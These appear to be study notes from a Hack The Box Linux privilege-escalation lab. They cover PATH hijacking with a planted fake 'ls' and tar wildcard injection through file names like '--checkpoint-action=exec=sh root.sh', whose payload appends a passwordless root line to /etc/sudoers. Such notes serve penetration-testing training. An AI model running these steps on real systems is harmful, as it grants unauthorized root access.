Path Abuse:

By abusing how Linux Path works, we can hijack functions by making linux find executables in our current directory first, first we need to add current directory (.) to PATH variable:
```
htb_student@NIX02:~$ PATH=.:${PATH}
htb_student@NIX02:~$ export PATH
htb_student@NIX02:~$ echo $PATH

.:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/games
```
After that, we can create a malicious version of whatever executable we want in current directory and hijack it:
```
htb_student@NIX02:~$ touch ls
htb_student@NIX02:~$ echo 'echo "PATH ABUSE!!"' > ls
htb_student@NIX02:~$ chmod +x ls
```

The above is only a harmless payload, but we can replace with anything we want

Next, if we execute ls, since . is added to the beginning of PATH, Linux will look for ls in our current directory first, meaning that our version of ls get executed instead of the normal version

Abusing Wildcard characters:

Below is a list of characters that is interpreted as wildcard:

|**Character**|**Significance**|
|---|---|
|`*`|An asterisk that can match any number of characters in a file name.|
|`?`|Matches a single character.|
|`[ ]`|Brackets enclose characters and can match any single one at the defined position.|
|`~`|A tilde at the beginning expands to the name of the user home directory or can have another username appended to refer to that user's home directory.|
|`-`|A hyphen within brackets will denote a range of characters.|

Commands like tar or rsync can be abused if such characters is in use, for example, we see the following at cronjob:

```
#
#
mh dom mon dow command
*/01 * * * * cd /home/htb-student && tar -zcf /home/htb-student/backup.tar.gz *
```

The since asterisk will match any number of characters in filename, this as result will match everything that's not hidden under the directory /home/htb-student (since the cronjob start by changing working directory to /home/htb-student), however, if we place file with names that start with --, the system will treat these as arguments instead of files, assuming the following is executed:

```
echo 'echo "htb-student ALL=(root) NOPASSWD: ALL" >> /etc/sudoers' > root.sh
htb-student@NIX02:~$ echo "" > "--checkpoint-action=exec=sh root.sh"
htb-student@NIX02:~$ echo "" > --checkpoint=1
```

When cronjob runs, the system interprets `--checkpoint=1` and `--checkpoint-action=exec=sh root.sh` as command arguments, as a result, the cronjob will execute content of root.sh, which is a payload that add our username to the sudoers list and allow us to run any command as root w/o password.

